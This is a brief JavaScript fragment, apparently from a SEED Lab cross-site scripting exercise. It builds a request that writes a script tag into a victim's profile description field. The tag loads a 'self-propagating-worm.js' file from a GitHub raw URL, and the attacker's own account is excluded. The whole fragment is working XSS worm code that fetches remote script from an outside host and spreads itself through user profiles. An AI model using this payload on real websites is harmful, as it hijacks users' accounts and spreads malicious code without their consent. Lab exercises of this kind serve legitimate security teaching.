...
if(user!='hackbiji'){
    ...
    content = content.concat("&&briefdescription=<script id='worm' type='text/javascript' src='https://raw.githubusercontent.com/isGt93/Keep-learning/master/mySeedLab/XSS/self-propagating-worm.js'></script>").concat(sub_script);
